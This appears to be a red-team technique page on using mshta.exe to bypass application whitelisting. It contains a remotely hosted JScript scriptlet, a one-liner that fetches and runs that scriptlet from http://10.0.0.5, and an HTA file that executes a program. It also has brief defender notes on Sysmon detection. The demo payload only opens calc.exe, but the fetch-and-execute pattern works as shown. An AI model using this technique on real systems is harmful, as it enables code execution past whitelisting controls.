---
description: MSHTA code execution - bypass application whitelisting.
---

# MSHTA

### Execution

Writing a scriptlet file that will launch calc.exe when invoked:

{% code title="<http://10.0.0.5/m.sct>" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```
{% endcode %}

Invoking the scriptlet file hosted remotely:

{% code title="attacker\@victim" %}
```csharp
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```
{% endcode %}

### Observations

As expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost immediately after invoking the calc.exe:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKCbZRMb_Bx1Qy5YK6%2F-LHKCYjhpCr1FQH8FZdr%2Fmshta-calc.png?alt=media\&token=998063d8-70ac-4589-b8c4-6c7918b11170)

As a defender, look at sysmon logs for mshta establishing network connections:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKDbQBVZGQ4K-y9nQD%2F-LHKEILHR5pBRaB5KGNc%2Fmshta-connection.png?alt=media\&token=aea0815a-3539-4a80-a4bf-ade7266f910b)

Also, suspicious commandlines:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKDbQBVZGQ4K-y9nQD%2F-LHKE-qfgAQ6ampZ5gu6%2Fmshta-commandline.png?alt=media\&token=063fc054-2200-45c1-ac16-6a475543b5e5)

### Bonus

The hta file can be invoked like so:

```csharp
mshta.exe http://10.0.0.5/m.hta
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKN7at5zSs8ln1A_LK%2F-LHKNDhiNyaEpAD1k6EM%2Fmshta-calc2.png?alt=media\&token=e04d99b6-3a5c-4f38-bfb0-5379b77e6d16)

or by navigating to the file itself, launching it and clicking run:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKNg9WNwld275SXV7v%2F-LHKOJ_6AwX7wGoW84pc%2Fmshta-url.png?alt=media\&token=4ee7abd5-14ec-4c40-90be-c75c55cdae4d)

{% code title="<http://10.0.0.5/m.hta>" %}
```markup
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```
{% endcode %}

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1170" %}
